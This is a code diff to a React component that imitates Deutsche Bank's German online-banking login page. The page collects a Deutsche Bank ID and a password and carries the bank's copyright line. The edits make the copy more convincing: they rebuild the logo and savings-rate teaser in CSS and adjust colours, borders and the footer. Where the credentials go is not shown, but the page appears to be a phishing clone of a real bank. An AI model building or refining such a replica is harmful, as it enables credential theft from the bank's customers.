@@ -5,8 +5,6 @@ import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
 import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
-import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
-import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
 const RED = "#c1002b";
@@ -25,7 +23,7 @@ const DeutscheBank = () => {
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
-  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);
+  usePageMeta("Deutsche Bank – Online-Banking", "/favicon.ico");
 
   const handleContinue = () => {
     if (dbId.trim().length === 0) return;
@@ -78,13 +76,13 @@ const DeutscheBank = () => {
                 <div className="pt-0.5">
                   <div
                     className="w-5 h-5 rounded-full flex items-center justify-center"
-                    style={{ backgroundColor: BLUE }}
+                    style={{ backgroundColor: "#1a3a4a" }}
                   >
                     <Info size={14} color="#fff" />
                   </div>
                 </div>
                 <div className="space-y-2">
-                  <div className="font-bold text-[15px]">Login mit Ihrer Deutsche Bank ID</div>
+                  <div className="text-[15px]">Login mit Ihrer Deutsche Bank ID</div>
                   <p>
                     Sie können sich im Online-Banking der Deutschen Bank nur noch mit Ihrer Deutsche
                     Bank ID anmelden. Der bisherige Link „Mit Filiale, Konto und PIN einloggen" ist
@@ -104,7 +102,21 @@ const DeutscheBank = () => {
 
               {/* Login card */}
               <div className="bg-white p-6 lg:p-8 shadow-sm">
-                <img src={logoAsset.url} alt="Deutsche Bank" className="h-5 mb-6" />
+                <div className="flex items-center gap-2 mb-6" style={{ color: "#111" }}>
+                  <span className="text-[18px] font-semibold">Deutsche Bank</span>
+                  <span
+                    className="inline-block"
+                    style={{
+                      width: 16,
+                      height: 16,
+                      border: `2px solid ${BLUE}`,
+                    }}
+                  >
+                    <span className="block w-full h-full" style={{
+                      background: `linear-gradient(to bottom right, transparent 45%, ${BLUE} 45%, ${BLUE} 55%, transparent 55%)`,
+                    }} />
+                  </span>
+                </div>
 
                 {step === 2 && (
                   <button
@@ -136,7 +148,7 @@ const DeutscheBank = () => {
                       onKeyDown={(e) => e.key === "Enter" && handleContinue()}
                       autoFocus
                       className="w-full px-3 py-3 text-[16px] outline-none"
-                      style={{ border: `2px solid ${RED}`, borderRadius: 2 }}
+                      style={{ border: `1px solid ${RED}`, borderRadius: 2 }}
                     />
 
                     <div className="flex items-center justify-between mt-10">
@@ -170,7 +182,7 @@ const DeutscheBank = () => {
                         onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                         autoFocus
                         className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
-                        style={{ border: `2px solid ${RED}`, borderRadius: 2 }}
+                        style={{ border: `1px solid ${RED}`, borderRadius: 2 }}
                       />
                       <button
                         type="button"
@@ -207,11 +219,23 @@ const DeutscheBank = () => {
 
             {/* RIGHT COLUMN */}
             <div className="bg-white shadow-sm">
-              {/* Teaser */}
+              {/* FestzinsSparen teaser - dark navy block with yellow text */}
               <a href="#" className="block">
-                <img src={teaserAsset.url} alt="FestzinsSparen" className="w-full h-auto block" />
+                <div
+                  className="px-6 py-6"
+                  style={{ backgroundColor: "#0a1a4a", color: "#e3ff00" }}
+                >
+                  <div className="flex items-start justify-end leading-none">
+                    <span className="text-[88px] font-bold tracking-tight">3,0</span>
+                    <span className="text-[64px] font-bold leading-none ml-1 mt-2">%</span>
+                    <span className="text-[12px] font-semibold mt-3 ml-0.5">p. a.*</span>
+                  </div>
+                  <div className="text-[36px] font-bold leading-none mt-1 text-right">
+                    FestzinsSparen
+                  </div>
+                </div>
                 <div className="px-5 py-4">
-                  <div className="text-[16px] font-semibold leading-snug">
+                  <div className="text-[16px] font-semibold leading-snug" style={{ color: "#111" }}>
                     3,0 % p.a.* Zinsen fest für<br />12 Monate bei Neugeld
                   </div>
                   <div className="text-[14px] mt-2" style={{ color: "#333" }}>
@@ -249,28 +273,29 @@ const DeutscheBank = () => {
                 links={["Link zu den Sicherheitsverfahren"]}
               />
 
-              {/* Footer */}
-              <div style={{ backgroundColor: BLUE }} className="text-white px-5 py-5 text-[13px]">
-                <div className="flex flex-wrap gap-x-4 gap-y-1 mb-2">
+              {/* Footer - white bg, dark navy links */}
+              <div className="px-5 py-5 text-[13px]" style={{ color: BLUE }}>
+                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-semibold">
                   <a href="#" className="hover:underline">English Version</a>
                   <a href="#" className="hover:underline">Hilfe</a>
                   <a href="#" className="hover:underline">Demo-Konto</a>
                 </div>
-                <div className="flex flex-wrap gap-x-4 gap-y-1 mb-2">
+                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-semibold">
                   <a href="#" className="hover:underline">Impressum</a>
                   <a href="#" className="hover:underline">Rechtliche Hinweise</a>
                   <a href="#" className="hover:underline">Datenschutz</a>
                 </div>
-                <div className="flex flex-wrap gap-x-4 gap-y-1 mb-4">
+                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-4 font-semibold">
                   <a href="#" className="hover:underline">Cookie-Einstellungen</a>
                 </div>
                 <button
                   type="button"
-                  className="bg-[#1e3fd6] hover:bg-[#2a4ee0] text-white text-[13px] font-semibold px-4 py-2 mb-3"
+                  className="text-white text-[13px] font-semibold px-4 py-2 mb-3"
+                  style={{ backgroundColor: "#1e3fd6" }}
                 >
                   Vertrag widerrufen
                 </button>
-                <div className="text-[12px] opacity-90">© 2026 Deutsche Bank AG</div>
+                <div className="text-[12px]" style={{ color: "#555" }}>© 2026 Deutsche Bank AG</div>
               </div>
             </div>
           </div>
